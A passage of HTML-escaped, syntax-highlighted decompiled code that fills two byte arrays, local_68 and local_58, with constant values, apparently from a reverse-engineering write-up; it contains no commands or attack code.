&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x85&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x7c
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x85&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x43
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x86&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x86
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x86&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xdf
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x87&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x1c
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x87&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x73
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x88&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x21
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x88&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x54
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x89&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x6e
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x89&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x31
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x8a&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x18
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x8a&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x75
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x8b&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x4e
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x8b&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x27
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x8c&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x30
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x8c&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x57
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x8d&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x3b
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x8d&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x53
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x8e&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xf
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x8e&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x7b
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x8f&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x2a
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x8f&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x75
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x90&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x26
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x90&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x48
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x91&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x6f
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x91&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;10
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x92&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xb8
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x92&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xdd
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x93&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x8e
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x93&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xea
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x94&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x4c
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x94&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x13
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x95&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x7f
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x95&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xb
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x96&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x22
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x96&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x4d
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x97&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xef
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x97&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xb0
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x98&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;99
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x98&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;7
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x99&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xa3
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x99&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xcc
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x9a&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xc2
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x9a&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x9d
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x9b&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;200
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x9b&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xa1
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x9c&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;99
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x9c&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x17
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x9d&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xd8
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x9d&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x87
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x9e&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x9e&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x60
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x9f&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x88
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x9f&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xed
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xa0&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x19
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xa0&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x7a
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xa1&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x5b
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xa1&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x3a
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xa2&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x78
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xa2&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xd
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xa3&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x7a
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xa3&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;9
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xa4&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x39
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xa4&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x5c
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xa5&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x8c
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xa5&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xd3
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xa6&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xbf
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xa6&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xd7
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xa7&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xc3
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xa7&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xa6
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xa8&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x19
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xa8&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x6b
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xa9&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x5d
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xa9&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x38
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xaa&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x87
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xaa&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xd8
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xab&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x9a
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xab&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xf3
